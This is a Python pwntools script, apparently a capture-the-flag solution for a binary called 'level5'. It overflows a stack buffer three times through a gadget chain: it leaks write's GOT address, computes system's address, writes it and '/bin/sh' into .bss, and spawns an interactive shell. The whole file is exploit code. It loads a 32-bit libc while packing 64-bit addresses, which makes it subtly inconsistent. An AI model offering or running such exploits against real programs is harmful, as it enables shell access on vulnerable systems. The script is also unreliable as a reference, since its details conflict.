from pwn import *

elf = ELF('level5')
libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')

p = process('./level5')

# 获取 GOT 地址
got_write = elf.got['write']
got_read = elf.got['read']

# 计算 system 函数的地址偏移
system_offset = libc.symbols['write'] - libc.symbols['system']

# 准备调用 write 函数的 payload
payload1 = b"\x00" * 136
payload1 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8)
payload1 += p64(0x4005F0)  # 准备 mov 和 call
payload1 += b"\x00" * 56
payload1 += p64(0x400564)  # main 地址

p.recvuntil(b"Hello, World\n")
p.send(payload1)
sleep(1)

# 获取 write 地址并计算 system 地址
write_addr = u64(p.recv(8))
system_addr = write_addr - system_offset

bss_addr = 0x601028

# 准备调用 read 函数的 payload
payload2 = b"\x00" * 136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)
payload2 += p64(0x4005F0)  # 准备 mov 和 call
payload2 += b"\x00" * 56
payload2 += p64(0x400564)  # main 地址

p.recvuntil(b"Hello, World\n")
p.send(payload2)
sleep(1)

# 发送 system 地址和 /bin/sh 字符串
p.send(p64(system_addr))
p.send(b"/bin/sh\x00")
sleep(1)

# 准备最终调用 system(payload3)
payload3 = b"\x00" * 136
payload3 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0) + p64(0)
payload3 += p64(0x4005F0)  # 准备 mov 和 call
payload3 += b"\x00" * 56
payload3 += p64(0x400564)  # main 地址

sleep(1)
p.send(payload3)

p.interactive()
